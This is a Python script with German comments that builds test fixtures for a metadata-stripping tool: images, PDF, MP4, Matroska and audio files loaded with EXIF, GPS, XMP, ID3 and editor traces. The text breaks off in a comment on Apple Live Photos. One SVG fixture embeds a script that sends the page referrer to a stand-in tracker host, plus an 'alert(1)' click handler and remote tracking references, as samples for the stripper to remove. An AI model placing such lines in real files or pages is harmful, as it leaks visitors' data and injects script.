"""Erzeugt echte Bilddateien mit echten Metadaten als Testvorlagen.

Die Modultests in cabrik-metadata bauen JPEGs und PNGs von Hand. Das prueft
die Struktur, aber nicht, ob das Ergebnis noch ein gueltiges Bild ist -- und
genau das war der v1-Palette-Bug: gueltige Datei, falsche Farben.

Hier entstehen deshalb Dateien mit Pillow und piexif, die anschliessend von
verify_metadata_stripped.py wieder geoeffnet und geprueft werden.

Aufruf:
    python testvectors/tools/gen_metadata_fixtures.py
"""
import json
import os

import piexif
from PIL import Image

ZIEL = os.path.join("testvectors", "metadata")
os.makedirs(ZIEL, exist_ok=True)

manifest = []


def gps_ifd():
    """Koordinaten des Bundeshauses in Bern -- Ortsangabe als Testfall."""
    return {
        piexif.GPSIFD.GPSLatitudeRef: b"N",
        piexif.GPSIFD.GPSLatitude: ((46, 1), (56, 1), (48, 1)),
        piexif.GPSIFD.GPSLongitudeRef: b"E",
        piexif.GPSIFD.GPSLongitude: ((7, 1), (26, 1), (39, 1)),
    }


# --- JPEG mit EXIF, GPS und eingebettetem Vorschaubild -----------------------

bild = Image.new("RGB", (64, 48))
for x in range(64):
    for y in range(48):
        bild.putpixel((x, y), (x * 4 % 256, y * 5 % 256, (x + y) % 256))

vorschau = bild.resize((16, 12))
vorschau_pfad = os.path.join(ZIEL, "_thumb.jpg")
vorschau.save(vorschau_pfad, "JPEG")
with open(vorschau_pfad, "rb") as f:
    vorschau_bytes = f.read()
os.remove(vorschau_pfad)

exif = {
    "0th": {
        piexif.ImageIFD.Make: b"Canon",
        piexif.ImageIFD.Model: b"EOS 5D Mark IV",
        piexif.ImageIFD.Software: b"Cabrik Testaufbau",
        piexif.ImageIFD.Artist: b"Max Mustermann",
        piexif.ImageIFD.DateTime: b"2026:03:14 15:09:26",
    },
    "Exif": {piexif.ExifIFD.DateTimeOriginal: b"2026:03:14 15:09:26"},
    "GPS": gps_ifd(),
    "1st": {},
    "thumbnail": vorschau_bytes,
}

jpeg_pfad = os.path.join(ZIEL, "foto_mit_exif.jpg")
bild.save(jpeg_pfad, "JPEG", exif=piexif.dump(exif), quality=90)
manifest.append({
    "datei": "foto_mit_exif.jpg",
    "format": "JPEG",
    "beschreibung": "Foto mit EXIF, GPS und eingebettetem Vorschaubild",
    "erwartet": {
        "hat_gps": True,
        "hat_vorschaubild": True,
        "groesse": list(bild.size),
        "modus": bild.mode,
    },
})

# --- JPEG ohne Metadaten ----------------------------------------------------

sauber_pfad = os.path.join(ZIEL, "foto_ohne_exif.jpg")
bild.save(sauber_pfad, "JPEG", quality=90)
manifest.append({
    "datei": "foto_ohne_exif.jpg",
    "format": "JPEG",
    "beschreibung": "Foto ohne Metadaten -- darf nicht veraendert werden",
    "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                 "groesse": list(bild.size), "modus": bild.mode},
})

# --- Palette-PNG: der v1-Bug ------------------------------------------------

palette_bild = Image.new("P", (32, 32))
# Eindeutige Palette, damit ein Verlust sofort auffaellt.
palette = []
for i in range(256):
    palette += [i, (255 - i), (i * 7) % 256]
palette_bild.putpalette(palette)
for x in range(32):
    for y in range(32):
        palette_bild.putpixel((x, y), (x * 8 + y) % 256)

png_pfad = os.path.join(ZIEL, "palette_mit_text.png")
palette_bild.save(png_pfad, "PNG", pnginfo=None)

# Text-Chunks nachtraegen -- Pillow schreibt sie ueber PngInfo.
from PIL import PngImagePlugin  # noqa: E402

info = PngImagePlugin.PngInfo()
info.add_text("Author", "Max Mustermann")
info.add_text("Software", "Cabrik Testaufbau")
info.add_text("Comment", "vertraulich")
palette_bild.save(png_pfad, "PNG", pnginfo=info)

manifest.append({
    "datei": "palette_mit_text.png",
    "format": "PNG",
    "beschreibung": "Palette-PNG mit Text-Chunks -- der v1-Palette-Bug",
    "erwartet": {
        "hat_gps": False,
        "hat_vorschaubild": False,
        "groesse": list(palette_bild.size),
        "modus": "P",
        "hat_palette": True,
    },
})

# --- Truecolor-PNG ohne Metadaten -------------------------------------------

rgb_png = os.path.join(ZIEL, "bild_ohne_text.png")
bild.save(rgb_png, "PNG")
manifest.append({
    "datei": "bild_ohne_text.png",
    "format": "PNG",
    "beschreibung": "PNG ohne Metadaten",
    "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                 "groesse": list(bild.size), "modus": "RGB"},
})

# ---------------------------------------------------------------------------
# WebP, GIF und BMP
#
# Drei Formate, drei verschiedene Arten, Metadaten unterzubringen: WebP in
# RIFF-Chunks, GIF in Erweiterungsbloecken, BMP praktisch gar nicht -- ausser
# hinter den Bilddaten, wo kein Betrachter je hinsieht.
# ---------------------------------------------------------------------------

_webp_exif = Image.Exif()
_webp_exif[0x010F] = "Kamerahersteller"
_webp_exif[0x0110] = "Modell XY-2000"
_webp_exif[0x9003] = "2026:03:01 09:12:00"

bild.save(
    os.path.join(ZIEL, "bild_mit_metadaten.webp"),
    "WEBP",
    exif=_webp_exif.tobytes(),
    xmp=b"<?xpacket?><x:xmpmeta><dc:creator>Dr. Anna Beispiel</dc:creator></x:xmpmeta>",
    icc_profile=b"FAKE-ICC-PROFIL-DATEN",
)
manifest.append({
    "datei": "bild_mit_metadaten.webp",
    "format": "WebP",
    "beschreibung": "WebP mit EXIF, XMP und Farbprofil",
    "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                 "groesse": list(bild.size), "modus": "RGB"},
})

bild.save(
    os.path.join(ZIEL, "bild_mit_metadaten.gif"),
    "GIF",
    comment=b"Erstellt mit Scanner XY-2000, Anna Beispiel",
)
manifest.append({
    "datei": "bild_mit_metadaten.gif",
    "format": "GIF",
    "beschreibung": "GIF mit Kommentar-Erweiterung",
    # GIF kennt nur Palettenbilder -- Pillow wandelt beim Speichern um.
    # Hier stand frueher "RGB", was die unabhaengige Pruefung zu Recht
    # bemaengelte, sobald sie das GIF ueberhaupt zu sehen bekam.
    "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                 "groesse": list(bild.size), "modus": "P"},
})

# BMP traegt selbst nichts -- das Anhaengsel hinter den Bilddaten dagegen
# schon. Es sieht kein Betrachter, mitverschickt wird es trotzdem.
_bmp_pfad = os.path.join(ZIEL, "bild_schlicht.bmp")
bild.save(_bmp_pfad, "BMP")
with open(_bmp_pfad, "rb") as f:
    _roh = f.read()
with open(_bmp_pfad, "wb") as f:
    f.write(_roh + b"HEIMLICHE-NUTZLAST-AM-ENDE")
manifest.append({
    "datei": "bild_schlicht.bmp",
    "format": "BMP",
    "beschreibung": "BMP mit Anhaengsel hinter den Bilddaten",
    "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                 "groesse": list(bild.size), "modus": "RGB"},
})

# ---------------------------------------------------------------------------
# TIFF
#
# Der schwierigste Bildfall: Die IFD-Struktur *ist* das Dateiformat, und die
# Bilddaten haengen an Versaetzen. Drei Vorlagen, weil drei verschiedene
# Entscheidungen zu pruefen sind:
#
#   bild_mit_exif.tiff       -- ein Verzeichnis, viele Metadatenmarken
#   scan_mehrseitig.tiff     -- zwei Seiten, die BEIDE bleiben muessen
#   bild_mit_vorschau.tiff   -- zweites Verzeichnis als verkleinerte Fassung,
#                               das entfernt werden muss
#
# Die letzten beiden sehen fuer einen fluechtigen Blick gleich aus. Der
# Unterschied steht in NewSubfileType (Marke 254, Bit 0).
# ---------------------------------------------------------------------------

import struct  # noqa: E402
from PIL import TiffImagePlugin  # noqa: E402

_tiff_info = TiffImagePlugin.ImageFileDirectory_v2()
_tiff_info[271] = "Kamerahersteller"
_tiff_info[272] = "Modell XY-2000"
_tiff_info[305] = "Bearbeitungsprogramm 3.1"
_tiff_info[306] = "2026:03:01 09:12:00"
_tiff_info[315] = "Dr. Anna Beispiel"
_tiff_info[316] = "ARBEITSPLATZ-MUSTER"
_tiff_info[270] = "Interne Fassung, nicht weitergeben"
_tiff_info[33432] = "(c) Kanzlei Muster"

_gross = bild.resize((64, 64))
_gross.save(os.path.join(ZIEL, "bild_mit_exif.tiff"), "TIFF", tiffinfo=_tiff_info)
manifest.append({
    "datei": "bild_mit_exif.tiff",
    "format": "TIFF",
    "beschreibung": "TIFF mit acht Metadatenmarken",
    "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                 "groesse": [64, 64], "modus": "RGB"},
})

_seite2 = Image.new("RGB", (64, 64), (30, 200, 30))
_gross.save(os.path.join(ZIEL, "scan_mehrseitig.tiff"), "TIFF",
            save_all=True, append_images=[_seite2], tiffinfo=_tiff_info)
manifest.append({
    "datei": "scan_mehrseitig.tiff",
    "format": "TIFF",
    "beschreibung": "Zweiseitiger Scan -- beide Seiten muessen bleiben",
    "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                 "groesse": [64, 64], "modus": "RGB"},
})


def _mit_vorschau(pfad):
    """Haengt ein Verzeichnis an, das sich als verkleinerte Fassung ausweist.

    Pillow schreibt NewSubfileType nicht. Alle Wertversaetze sind absolut und
    bleiben gueltig -- deshalb genuegt es, das Verzeichnis am Dateiende neu zu
    schreiben und das erste darauf zeigen zu lassen.
    """
    roh = bytearray(open(pfad, "rb").read())
    u16 = lambda o: struct.unpack_from("<H", roh, o)[0]
    u32 = lambda o: struct.unpack_from("<I", roh, o)[0]

    erste = u32(4)
    ketten_pos = erste + 2 + u16(erste) * 12
    zweite = u32(ketten_pos)

    eintraege = [
        (u16(zweite + 2 + i * 12), u16(zweite + 2 + i * 12 + 2),
         u32(zweite + 2 + i * 12 + 4), bytes(roh[zweite + 2 + i * 12 + 8:
                                                 zweite + 2 + i * 12 + 12]))
        for i in range(u16(zweite))
    ]
    eintraege.append((254, 3, 1, struct.pack("<HH", 1, 0)))
    eintraege.sort(key=lambda e: e[0])

    neu = bytearray(struct.pack("<H", len(eintraege)))
    for tag, typ, count, feld in eintraege:
        neu += struct.pack("<HHI", tag, typ, count) + feld
    neu += struct.pack("<I", 0)

    struct.pack_into("<I", roh, ketten_pos, len(roh))
    roh += neu
    with open(pfad, "wb") as f:
        f.write(bytes(roh))


_klein = _gross.resize((16, 16))
_vorschau_pfad = os.path.join(ZIEL, "bild_mit_vorschau.tiff")
_gross.save(_vorschau_pfad, "TIFF", save_all=True, append_images=[_klein],
            tiffinfo=_tiff_info)
_mit_vorschau(_vorschau_pfad)
manifest.append({
    "datei": "bild_mit_vorschau.tiff",
    "format": "TIFF",
    "beschreibung": "TIFF mit Vorschau-Verzeichnis -- muss entfernt werden",
    "erwartet": {"hat_gps": False, "hat_vorschaubild": True,
                 "groesse": [64, 64], "modus": "RGB"},
})

# ---------------------------------------------------------------------------
# HEIC und AVIF (ISO-BMFF)
#
# Hier wird nicht neu gebaut, sondern an Ort und Stelle ersetzt: Die Exif- und
# XMP-Nutzdaten werden durch gueltige leere Bloecke gleicher Laenge ersetzt.
# Die pruefbare Eigenschaft ist deshalb ungewoehnlich klar -- die Dateilaenge
# muss danach auf das Byte genau dieselbe sein.
# ---------------------------------------------------------------------------

try:
    import pillow_heif  # noqa: E402

    pillow_heif.register_heif_opener()

    _bmff_exif = Image.Exif()
    _bmff_exif[0x010F] = "Kamerahersteller"
    _bmff_exif[0x0110] = "Modell XY-2000"
    _bmff_exif[0x0131] = "Bearbeitungsprogramm 3.1"
    _bmff_exif[0x0132] = "2026:03:01 09:12:00"
    _bmff_exif[0x013B] = "Dr. Anna Beispiel"

    _bmff_xmp = (
        b'<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>'
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b"<dc:creator>Dr. Anna Beispiel</dc:creator>"
        b"</x:xmpmeta><?xpacket end=\"w\"?>"
    )

    for _name, _fmt in [("bild_mit_exif.avif", "AVIF"), ("bild_mit_exif.heic", "HEIF")]:
        bild.resize((64, 64)).save(
            os.path.join(ZIEL, _name), _fmt,
            exif=_bmff_exif.tobytes(), xmp=_bmff_xmp,
        )
        manifest.append({
            "datei": _name,
            "format": _fmt,
            "beschreibung": f"{_fmt} mit Exif und XMP -- Laenge muss erhalten bleiben",
            "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                         "groesse": [64, 64], "modus": "RGB"},
        })
except ImportError:
    print("  HINWEIS: pillow-heif fehlt, HEIC/AVIF-Vorlagen entfallen")
    print("           nachruesten mit: pip install pillow-heif")

# ---------------------------------------------------------------------------
# SVG
#
# Das ungewoehnlichste Format: beliebiges XML mit Programmcode, Verweisen auf
# fremde Rechner und einem eingebetteten Foto samt GPS. Die Vorlage bildet ab,
# was Inkscape tatsaechlich hinterlaesst -- einschliesslich des Dateipfads mit
# dem Benutzernamen.
# ---------------------------------------------------------------------------

import base64  # noqa: E402

with open(os.path.join(ZIEL, "foto_mit_exif.jpg"), "rb") as f:
    _foto_b64 = base64.b64encode(f.read()).decode()

_bs = chr(92)
_svg_pfad = f"C:{_bs}Users{_bs}m.mustermann{_bs}Entwuerfe{_bs}Angebot-final-v3.svg"

_svg_zeilen = [
    '<?xml version="1.0" encoding="UTF-8"?>',
    '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"'
    ' "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"',
    '     xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"',
    '     xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"',
    '     xmlns:dc="http://purl.org/dc/elements/1.1/"',
    '     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"',
    '     width="200" height="200" viewBox="0 0 200 200"',
    '     inkscape:version="1.1.2 (b8e25be833, 2022-02-05)"',
    f'     sodipodi:docname="{_svg_pfad}">',
    "  <!-- Entwurf von Dr. Anna Beispiel, Kanzlei Muster -->",
    "  <title>Interner Entwurf</title>",
    "  <desc>Nicht an den Kunden geben</desc>",
    "  <metadata><rdf:RDF><dc:creator>Dr. Anna Beispiel</dc:creator>",
    "    <dc:title>Angebot Nordstern</dc:title></rdf:RDF></metadata>",
    '  <sodipodi:namedview inkscape:zoom="1.4" inkscape:cx="100"/>',
    '  <script>fetch("https://tracker.example/melde?wer=" + document.referrer)</script>',
    '  <g inkscape:label="Ebene 1" inkscape:groupmode="layer" transform="translate(10,10)">',
    '    <rect width="80" height="80" fill="#c81e1e" stroke-width="2" onclick="alert(1)"/>',
    f'    <image x="90" y="0" width="80" height="80"'
    f' xlink:href="data:image/jpeg;base64,{_foto_b64}"/>',
    '    <image x="0" y="90" width="40" height="40" href="https://tracker.example/pixel.png"/>',
    '    <circle cx="140" cy="140" r="20" style="fill:url(https://fremd.example/m.png)"/>',
    '    <text x="10" y="180" font-family="serif" font-size="12">Sichtbarer Text</text>',
    "  </g>",
    "</svg>",
]

with open(os.path.join(ZIEL, "zeichnung_mit_metadaten.svg"), "w",
          encoding="utf-8", newline="\n") as f:
    f.write("\n".join(_svg_zeilen) + "\n")

manifest.append({
    "datei": "zeichnung_mit_metadaten.svg",
    "format": "SVG",
    "beschreibung": "SVG mit Skript, Zaehlpixel, Editorspuren und eingebettetem Foto",
    "erwartet": {"hat_gps": True, "hat_vorschaubild": True,
                 "groesse": [200, 200], "modus": "RGB"},
})

# ---------------------------------------------------------------------------
# PDF mit Aenderungshistorie
#
# Der folgenreichste Fall des ganzen Moduls: Die Datei zeigt eine geschwaerzte
# Stelle an und enthaelt die ungeschwaerzte Fassung vollstaendig lesbar. So
# entstehen "geschwaerzte" Dokumente, die nichts verbergen.
# ---------------------------------------------------------------------------

try:
    import re as _re
    import zlib as _zlib
    from reportlab.lib.pagesizes import A4 as _A4
    from reportlab.pdfgen import canvas as _canvas

    _pdf = os.path.join(ZIEL, "dokument_mit_verlauf.pdf")
    _c = _canvas.Canvas(_pdf, pagesize=_A4)
    _c.setTitle("Angebot Projekt Nordstern")
    _c.setAuthor("Dr. Anna Beispiel")
    _c.setSubject("Preisverhandlung")
    _c.setCreator("Kanzlei Muster und Partner")
    _c.setKeywords("vertraulich, intern")
    _c.drawString(72, 750, "Angebot")
    _c.drawString(72, 720, "Unser Preis betraegt 240.000 Euro.")
    _c.drawString(72, 690, "Interne Marge: 38 Prozent.")
    _c.save()

    # Inkrementelle Aenderung anhaengen: die Marge wird "geschwaerzt".
    # Die alte Fassung bleibt dabei vollstaendig in der Datei stehen.
    with open(_pdf, "rb") as _f:
        _d = bytearray(_f.read())
    _m = _re.search(rb"(\d+) 0 obj\s*<<[^>]*?/Length[^>]*?>>\s*stream", bytes(_d), _re.S)
    _nr = int(_m.group(1))
    _neu = _zlib.compress(
        b"BT /F1 12 Tf 72 750 Td (Angebot) Tj ET\n"
        b"BT /F1 12 Tf 72 720 Td (Unser Preis betraegt 240.000 Euro.) Tj ET\n"
        b"BT /F1 12 Tf 72 690 Td (Interne Marge: XXXXXXXXXXX) Tj ET\n"
    )
    _obj = (f"{_nr} 0 obj\n<< /Length {len(_neu)} /Filter /FlateDecode >>\nstream\n".encode()
            + _neu + b"\nendstream\nendobj\n")
    _altref = int(_re.findall(rb"startxref\s+(\d+)", bytes(_d))[-1])
    if not _d.endswith(b"\n"):
        _d += b"\n"
    _voff = len(_d)
    _d += _obj
    _xpos = len(_d)
    _root = _re.search(rb"/Root\s+(\d+)", bytes(_d)).group(1)
    _info = _re.search(rb"/Info\s+(\d+)", bytes(_d)).group(1)
    _d += (b"xref\n" + f"{_nr} 1\n".encode() + f"{_voff:010d} 00000 n \n".encode()
           + b"trailer\n<< /Size 20 /Root " + _root + b" 0 R /Info " + _info
           + b" 0 R /Prev " + str(_altref).encode() + b" >>\nstartxref\n"
           + str(_xpos).encode() + b"\n%%EOF\n")
    with open(_pdf, "wb") as _f:
        _f.write(bytes(_d))

    manifest.append({
        "datei": "dokument_mit_verlauf.pdf",
        "format": "PDF",
        "beschreibung": "PDF mit Aenderungshistorie -- geschwaerzte Stelle bleibt lesbar",
        "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                     "groesse": [595, 842], "modus": "RGB"},
    })
except ImportError:
    print("  HINWEIS: reportlab fehlt, PDF-Vorlage entfaellt")

# ---------------------------------------------------------------------------
# MP4 -- von Hand gebaut
# ---------------------------------------------------------------------------
#
# Pillow kann keine Videos, und ffmpeg soll keine Voraussetzung dieses
# Projekts werden. ISO-BMFF ist aber einfach genug, um es aufzuschreiben --
# und das hat einen Vorteil: Die Vorlage enthaelt genau die Boxen, um die es
# geht, ohne dass ein fremdes Werkzeug still etwas hinzufuegt. Dass daraus ein
# gueltiges MP4 wird, pruefen die Tests unabhaengig mit mutagen.


def _box(typ: bytes, *teile: bytes) -> bytes:
    inhalt = b"".join(teile)
    return (8 + len(inhalt)).to_bytes(4, "big") + typ + inhalt


def _voll(typ: bytes, *teile: bytes) -> bytes:
    """FullBox: vier Bytes Version und Merkmale vor dem Inhalt."""
    return _box(typ, bytes(4), *teile)


def _u32(x: int) -> bytes:
    return x.to_bytes(4, "big")


def _u16(x: int) -> bytes:
    return x.to_bytes(2, "big")


# 2022-03-05, gezaehlt in Sekunden seit 1904 -- so rechnet ISO-BMFF.
_ZEIT = _u32(3855000000)
_MATRIX = b"".join(_u32(x) for x in (0x10000, 0, 0, 0, 0x10000, 0, 0, 0, 0x40000000))
# Die iTunes-Marken beginnen mit dem Copyright-Zeichen, Byte 0xA9.
_C = bytes([0xA9])


def _marke(name: bytes, text: str) -> bytes:
    """Eine iTunes-Marke: Der Wert steckt in einer `data`-Box darunter."""
    return _box(name, _box(b"data", _u32(1), _u32(0), text.encode("utf-8")))


_mvhd = _voll(b"mvhd", _ZEIT, _ZEIT, _u32(1000), _u32(5000), _u32(0x10000),
              _u16(0x0100), bytes(10), _MATRIX, bytes(24), _u32(2))

_tkhd = _voll(b"tkhd", _ZEIT, _ZEIT, _u32(1), bytes(4), _u32(5000), bytes(8),
              bytes(8), _MATRIX, _u32(640 << 16), _u32(480 << 16))

_mdhd = _voll(b"mdhd", _ZEIT, _ZEIT, _u32(30000), _u32(150000), _u16(0x55C4), bytes(2))

# Der `hdlr` in `mdia` sagt, worum es sich handelt. Ohne ihn ist die Datei
# unvollstaendig -- mutagen weigert sich dann, und zu Recht.
_vide = _voll(b"hdlr", bytes(4), b"vide", bytes(12), b"VideoHandler\x00")
_trak = _box(b"trak", _tkhd, _box(b"mdia", _mdhd, _vide))

# Der schwerwiegendste Fund: die Aufnahmekoordinaten. Jedes Mobiltelefon
# schreibt sie in genau diese Box, im Format nach ISO 6709.
_ort = "+46.9481+007.4474/".encode("utf-8")
_xyz = _box(_C + b"xyz", _u16(len(_ort)), _u16(0x15C7), _ort)

_ilst = _box(b"ilst",
             _marke(_C + b"nam", "Angebot Nordstern"),
             _marke(_C + b"ART", "Dr. Anna Beispiel"),
             _marke(_C + b"too", "Bearbeitungsprogramm 3.1"),
             _marke(_C + b"cmt", "Nicht an den Kunden geben"))

_hdlr = _voll(b"hdlr", bytes(4), b"mdir", b"appl", bytes(9))
_udta = _box(b"udta", _xyz, _voll(b"meta", _hdlr, _ilst))

_mp4 = (_box(b"ftyp", b"isom", _u32(512), b"isom", b"iso2", b"mp41")
        + _box(b"moov", _mvhd, _trak, _udta)
        + _box(b"mdat", bytes(512)))

with open(os.path.join(ZIEL, "video_mit_ortsangabe.mp4"), "wb") as _f:
    _f.write(_mp4)

manifest.append({
    "datei": "video_mit_ortsangabe.mp4",
    "format": "MP4",
    "beschreibung": "MP4 mit GPS-Aufnahmeort, iTunes-Marken und Zeitstempeln",
    "erwartet": {"hat_gps": True, "hat_vorschaubild": False,
                 "groesse": [640, 480], "modus": "video"},
})

# ---------------------------------------------------------------------------
# Matroska, WebM und AVI -- mit PyAV, also mit echtem ffmpeg
# ---------------------------------------------------------------------------
#
# Die MP4-Vorlage oben ist von Hand gebaut. Das prueft die Struktur, aber
# nicht die Wirklichkeit: Die Datei stammt aus demselben Verstaendnis wie der
# Code, der sie liest. Genau so blieb bei Matroska erst ein falsches Byte in
# der Kennung des Info-Elements unbemerkt.
#
# Diese drei Vorlagen erzeugt ffmpeg. Sie zeigen, wohin ein wirklicher
# Muxer die Angaben schreibt -- und die Tests koennen mit demselben ffmpeg
# nachweisen, dass sich die Datei nach dem Bereinigen noch abspielen laesst.

try:
    import av as _av

    _VIDEO_META = {
        "title": "Angebot Nordstern",
        "artist": "Dr. Anna Beispiel",
        "comment": "Nicht an den Kunden geben",
        "description": "Interner Rohschnitt",
    }

    def _baue_video(pfad, behaelter, codec):
        aus = _av.open(pfad, "w", format=behaelter)
        spur = aus.add_stream(codec, rate=25)
        spur.width, spur.height = 64, 48
        spur.pix_fmt = "yuv420p"
        aus.metadata.update(_VIDEO_META)
        spur.metadata["title"] = "Kameraspur A"
        for i in range(25):
            bild = _av.VideoFrame(64, 48, "rgb24")
            bild.planes[0].update(bytes([(i * 10) % 256]) * (64 * 48 * 3))
            for paket in spur.encode(bild):
                aus.mux(paket)
        for paket in spur.encode():
            aus.mux(paket)
        aus.close()

    for _name, _behaelter, _codec, _beschreibung in (
        ("video_mit_marken.mkv", "matroska", "libx264",
         "Matroska mit Tags, Spurname und SegmentUID -- von ffmpeg erzeugt"),
        ("video_mit_marken.webm", "webm", "libvpx",
         "WebM mit denselben Marken -- dasselbe EBML, anderer DocType"),
        ("video_mit_marken.avi", "avi", "mpeg4",
         "AVI mit LIST INFO und strn -- von ffmpeg erzeugt"),
    ):
        _p = os.path.join(ZIEL, _name)
        _baue_video(_p, _behaelter, _codec)
        manifest.append({
            "datei": _name,
            "format": _behaelter.upper(),
            "beschreibung": _beschreibung,
            "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                         "groesse": [64, 48], "modus": "video"},
        })
except ImportError:
    print("  HINWEIS: PyAV fehlt, die Videovorlagen entfallen (pip install av)")

# ---------------------------------------------------------------------------
# Tondateien
# ---------------------------------------------------------------------------
#
# Fuenf Formate, fuenf verschiedene Wege, Marken unterzubringen -- und zwei
# Faelle, die ffmpeg von sich aus NICHT erzeugt und die trotzdem die
# wichtigsten sind:
#
#   * der bext-Block in WAV, den jeder Feldrekorder schreibt
#   * ein eingebettetes Bild im MP3, das eigene Metadaten mitbringt
#
# Beide werden deshalb nachtraeglich eingesetzt -- nach EBU Tech 3285
# beziehungsweise nach der ID3v2-Norm, nicht nach eigenem Gutduenken.

try:
    import av as _av2

    _TON_META = {
        "title": "Angebot Nordstern",
        "artist": "Dr. Anna Beispiel",
        "comment": "Nicht an den Kunden geben",
        "album": "Interner Rohschnitt",
        "date": "2026",
    }

    def _baue_ton(pfad, behaelter, codec, rate=44100):
        import fractions

        aus = _av2.open(pfad, "w", format=behaelter)
        spur = aus.add_stream(codec, rate=rate)
        try:
            spur.codec_context.options = {"strict": "-2"}
        except Exception:
            pass
        spur.metadata.update(_TON_META)
        aus.metadata.update(_TON_META)
        n = 0
        for _ in range(20):
            r = _av2.AudioFrame(
                format=spur.format.name, layout="mono", samples=spur.frame_size or 1024
            )
            r.sample_rate = rate
            r.pts = n
            r.time_base = fractions.Fraction(1, rate)
            for e in r.planes:
                e.update(bytes(e.buffer_size))
            n += r.samples
            for paket in spur.encode(r):
                aus.mux(paket)
        for paket in spur.encode():
            aus.mux(paket)
        aus.close()

    for _name, _beh, _cod, _rate, _besch in (
        ("ton_mit_marken.mp3", "mp3", "libmp3lame", 44100,
         "MP3 mit ID3v2, spaeter ergaenzt um ID3v1 und ein eingebettetes Bild"),
        ("ton_mit_marken.flac", "flac", "flac", 44100,
         "FLAC mit VORBIS_COMMENT und einem PADDING-Block von ffmpeg"),
        ("ton_mit_marken.ogg", "ogg", "vorbis", 48000,
         "Ogg Vorbis -- Seiten mit CRC, Kommentar im zweiten Paket"),
        ("ton_mit_marken.opus", "opus", "libopus", 48000,
         "Opus -- wie Vorbis, aber OHNE Rahmenbit"),
        ("ton_mit_marken.wav", "wav", "pcm_s16le", 44100,
         "WAV mit LIST INFO, spaeter ergaenzt um einen bext-Block"),
    ):
        _p = os.path.join(ZIEL, _name)
        _baue_ton(_p, _beh, _cod, _rate)
        manifest.append({
            "datei": _name,
            "format": _beh.upper(),
            "beschreibung": _besch,
            "erwartet": {"hat_gps": False, "hat_vorschaubild": False,
                         "groesse": [0, 0], "modus": "ton"},
        })

    # --- Der bext-Block, den ein Feldrekorder schreibt ---------------------
    #
    # Feste Feldbreiten nach EBU Tech 3285, nicht nullterminiert. Er wird vor
    # den data-Block gesetzt, wie es die Norm vorsieht.
    _bext = bytearray(602)

    def _setze(versatz, text):
        b = text.encode("ascii")
        _bext[versatz:versatz + len(b)] = b

    _setze(0, "Interview Hinterhof, Quelle will anonym bleiben")   # Description
    _setze(256, "Dr. Anna Beispiel")                               # Originator
    _setze(288, "ZOOM-F8N-00473829")                               # Reference
    _setze(320, "2026-03-01")                                      # Date
    _setze(330, "09:12:00")                                        # Time
    _bext[338:402] = bytes(range(64))                              # UMID
    _bext += b"A=PCM,F=44100,W=16,M=mono,T=ZOOM F8n\x00"           # CodingHistory

    _wav = os.path.join(ZIEL, "ton_mit_marken.wav")
    with open(_wav, "rb") as _f:
        _roh = bytearray(_f.read())

    # RIFF richtet jeden Block auf gerade Adressen aus: Bei ungerader Laenge
    # folgt ein Fuellbyte, das NICHT zur Laengenangabe zaehlt. Ohne dieses
    # Byte liest ein normgerechter Leser den naechsten Block um eins versetzt
    # -- aus "data" wird "ata ", und die Datei ist unbrauchbar.
    _fuell = bytes(len(_bext) % 2)
    _block = b"bext" + len(_bext).to_bytes(4, "little") + bytes(_bext) + _fuell
    _pos = _roh.find(b"data")
    assert _pos > 0, "kein data-Block in der WAV-Vorlage"
    _roh[_pos:_pos] = _block
    # Die Groesse im RIFF-Kopf zaehlt alles hinter ihr selbst mit.
    _riff = int.from_bytes(_roh[4:8], "little") + len(_block)
    _roh[4:8] = _riff.to_bytes(4, "little")
    with open(_wav, "wb") as _f:
        _f.write(bytes(_roh))

    # --- Eingebettetes Bild und ID3v1 im MP3 ------------------------------
    try:
        from mutagen.id3 import ID3, APIC, PRIV

        _mp3 = os.path.join(ZIEL, "ton_mit_marken.mp3")
        with open(os.path.join(ZIEL, "foto_mit_exif.jpg"), "rb") as _f:
            _jpeg = _f.read()

        _tags = ID3(_mp3)
        # Das eingebettete Bild ist ein vollstaendiges JPEG MIT EIGENEM EXIF --
        # Kamera, Ort und Name des Fotografen reisen im Musikstueck mit.
        _tags.add(APIC(encoding=0, mime="image/jpeg", type=3,
                       desc="Titelbild", data=_jpeg))
        # Eine Kennung, wie sie Haendler vergeben.
        _tags.add(PRIV(owner="WM/UniqueFileIdentifier",
                       data=b"Kunde-4711-Bestellung-2026-03-01"))
        # v1=2 schreibt zusaetzlich einen ID3v1-Tag ans Dateiende.
        _tags.save(_mp3, v1=2)
    except ImportError:
        print("  HINWEIS: mutagen fehlt, MP3-Vorlage bleibt ohne Bild")

except ImportError:
    print("  HINWEIS: PyAV fehlt, die Tonvorlagen entfallen (pip install av)")

# ---------------------------------------------------------------------------
# Die Videohaelfte eines Apple Live Photo
# ---------------------------------------------------------------------------
#
# Ein Live Photo besteht aus ZWEI Dateien: IMG_1234.HEIC und IMG_1234.MOV.
# Verknuepft werden sie durch einen gemeinsamen Kennzeichner --
# "com.apple.quicktime.content.identifier" im Film, Apples MakerNote-Marke
# 0x0011 im Bild. Wer nur eine der beiden bereinigt, laesst die Verbindung
# bestehen.
#
# Apple legt seine Angaben NICHT als iTunes-Marken ab (vierstellige Codes wie
# ©nam), sondern im mdta-Schluesselverzeichnis: Ein `keys`-Kasten fuehrt die
# vollen Namen, im `ilst` steht als Kastentyp nur der INDEX in diese Liste.
# Ein Leser, der auf ©-Codes prueft, sieht dort gar nichts -- und meldete
# deshalb bei einem echten Handyvideo den Aufnahmeort NICHT.
#
